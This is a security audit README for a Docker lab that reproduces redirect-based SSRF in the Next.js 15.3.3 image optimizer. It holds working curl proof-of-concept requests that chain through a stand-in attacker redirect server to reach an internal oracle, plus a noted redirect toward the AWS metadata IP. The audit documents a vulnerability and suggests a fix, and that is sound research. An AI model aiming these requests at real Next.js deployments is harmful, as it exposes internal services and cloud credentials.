# Audit: Next.js Image Optimizer SSRF

Target: `/_next/image?url=` endpoint — the image optimizer's external URL fetch path.

## Key finding from source analysis

**Next.js 15.3.3 has no private-IP check and follows redirects blindly.** The only SSRF defense is `matchRemotePattern` (hostname glob matching against the initial URL). Redirect targets are never re-validated.

See `analysis/code-paths.md` for full annotated source trace.

## Quick start

```bash
cd lab/
docker compose build
docker compose up -d

# Verify harness
curl 'http://localhost:3001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fimage.jpg&w=64&q=75' -o /dev/null -w '%{http_code}\n'
# Should return 200

# Run test matrix
cd ..
node scripts/run-tests.mjs

# Analyze results
node scripts/analyze-results.mjs
```

## Services

| Service | Host Port | Docker IP | Purpose |
|---------|-----------|-----------|---------|
| app-baseline | 3001 | auto | Allowlist: 10.99.0.10 only |
| app-wildcard | 3002 | auto | Allowlist: ** (all hosts) |
| app-subdomain | 3003 | auto | Allowlist: *.attacker.local |
| app-rebind | 3004 | auto | Allowlist: rebind.attacker.local |
| attacker | 4444 | 10.99.0.10 | Redirect server |
| oracle | 4010 | 10.99.0.100 | Internal SSRF target |
| dns-server | 5353 | 10.99.0.2 | DNS + rebind control |

## Version matrix

| Version | Purpose |
|---------|---------|
| 15.3.3 | Primary — no IP check, no redirect validation, memory DoS |
| 15.5.10 | Post memory-DoS fix — still no IP check or redirect validation |

## Test matrix

23 payloads across 10 technique classes. See `payloads/ssrf-matrix.json`.

Highest-confidence: redirect-based SSRF (tests 1-8) — redirect targets bypass `remotePatterns` allowlist.

## Reproduction (validated 2026-06-19)

Reproduced against a clean `docker compose build` of this lab on 2026-06-19.
Pinned versions:

- `next@15.3.3` (confirmed in `lab/nextjs-app/package.json` and built into the standalone runtime)
- Node 20-slim base image (built-in to each Dockerfile)
- Attacker/oracle/dns images use Express 4 and `dns2@2.x` per their `package.json` files

### Step-by-step

1. **Build the stack** (4 Next.js apps + attacker + oracle + dns-server):

   ```bash
   sudo docker compose -f harness/web-tech-ndays/audits/nextjs-image-ssrf/lab/docker-compose.yml build
   ```

2. **Bring it up** and wait for health on the 4 Next.js ports:

   ```bash
   sudo docker compose -f harness/web-tech-ndays/audits/nextjs-image-ssrf/lab/docker-compose.yml up -d
   for p in 13001 13002 13003 13004; do
     curl -s -o /dev/null -w "port $p: %{http_code}\n" \
       "http://127.0.0.1:$p/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fimage.jpg&w=64&q=75"
   done
   # All four return 200.
   ```

3. **Run the test matrix** (23 payloads, grouped by config):

   ```bash
   node harness/web-tech-ndays/audits/nextjs-image-ssrf/scripts/run-tests.mjs
   node harness/web-tech-ndays/audits/nextjs-image-ssrf/scripts/analyze-results.mjs
   ```

   Per-run snapshot is written to
   `harness/web-tech-ndays/audits/nextjs-image-ssrf/results/run-<epoch>.json`
   and `…-analysis.md` (e.g. `run-1781879870.json` for the validated run).

4. **Capture PoC evidence** (these are the working SSRF requests):

   ```bash
   # PoC 1 — 302 → oracle image (200, 113-byte PNG body proves the SSRF + body leak)
   curl -s "http://127.0.0.1:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect%3Fto%3Dhttp%3A%2F%2F10.99.0.100%2Fimage.png&w=64&q=75" \
     -o /tmp/r1.bin -w "HTTP=%{http_code} size=%{size_download}\n"
   file /tmp/r1.bin
   # → PNG image data, 4x4, 8-bit colormap (the oracle's PNG, served via redirect)

   # PoC 2 — 302 → oracle /metadata (admin JSON; 400 from optimizer, but oracle logged the hit)
   curl -s -X POST http://127.0.0.1:4010/logs/clear >/dev/null
   curl -s "http://127.0.0.1:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect%3Fto%3Dhttp%3A%2F%2F10.99.0.100%2Fmetadata&w=64&q=75" \
     -o /tmp/r2.bin -w "HTTP=%{http_code} size=%{size_download}\n"
   curl -s http://127.0.0.1:4010/logs | python3 -m json.tool
   # → entry: GET /metadata from 10.99.0.6 (Next.js app reaching internal oracle)

   # PoC 3 — Allowlist-bypass proof (direct → blocked, via redirect → succeeds)
   curl -s "http://127.0.0.1:13001/_next/image?url=http%3A%2F%2F10.99.0.100%2Fimage.png&w=64&q=75" \
     -o /tmp/r3.bin -w "HTTP=%{http_code}\n"; cat /tmp/r3.bin
   # → HTTP=400  "url" parameter is not allowed   (allowlist enforced)
   curl -s "http://127.0.0.1:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect%3Fto%3Dhttp%3A%2F%2F10.99.0.100%2Fimage.png&w=64&q=75" \
     -o /tmp/r4.bin -w "HTTP=%{http_code} size=%{size_download}\n"; file /tmp/r4.bin
   # → HTTP=200, 113-byte PNG (allowlist BYPASSED via attacker redirect)
   ```

   Full evidence transcript: `targets/labs/nextjs-image-ssrf/results.txt`.

5. **Tear down**:

   ```bash
   sudo docker compose -f harness/web-tech-ndays/audits/nextjs-image-ssrf/lab/docker-compose.yml down -v --remove-orphans
   ```

### Observed output (validated run 2026-06-19, 8 redirect-SSRF payloads)

| # | Payload ID                    | Verdict          | HTTP | Time  | Oracle hit |
|---|-------------------------------|------------------|------|-------|------------|
| 1 | redirect-302-oracle-image     | **SSRF_CONFIRMED** | 200  |  4 ms | yes        |
| 2 | redirect-307-oracle-image     | **SSRF_CONFIRMED** | 200  |  3 ms | yes        |
| 3 | redirect-308-oracle-image     | **SSRF_CONFIRMED** | 200  |  3 ms | yes        |
| 4 | redirect-302-oracle-metadata  | **SSRF_CONFIRMED** | 400  |  4 ms | yes        |
| 5 | redirect-chain-2hop           | **SSRF_CONFIRMED** | 200  |  3 ms | yes        |
| 6 | redirect-chain-5hop           | **SSRF_CONFIRMED** | 200  |  3 ms | yes        |
| 7 | redirect-chain-20hop          | BLOCKED         | 500  | 14 ms | no (fetch's 20-hop default limit hit) |
| 8 | redirect-localhost            | BLOCKED         | 500  |  5 ms | no (control: redirect to own :3000) |

Bonus: `redirect-aws-metadata` (302 → `169.254.169.254`) → **SSRF_LIKELY**, HTTP 504
after 7.0 s — the connect attempt was actually made and timed out, confirming
the optimizer follows the redirect to AWS metadata IPs (would leak credentials
in any cloud environment).

Overall matrix: **8 CONFIRMED, 3 LIKELY, 12 BLOCKED, 0 ERRORS** out of 23 payloads.

### Honest verdict

**CONFIRMED for redirect-SSRF on next@15.3.3.** All three redirect status codes
(302, 307, 308), all redirect targets (`/image.png`, `/metadata`), and multi-hop
chains (2, 5 hops) reach the internal oracle. The `remotePatterns` allowlist is
applied only to the initial URL; redirect targets are never re-validated, and
no private-IP DNS check exists in this version. The fix would be to switch
`fetchExternalImage` to `redirect: 'manual'` (or `'error'`) and re-run
`matchRemotePattern` against the final URL, but this has no released patch as
of 2026-06-19.
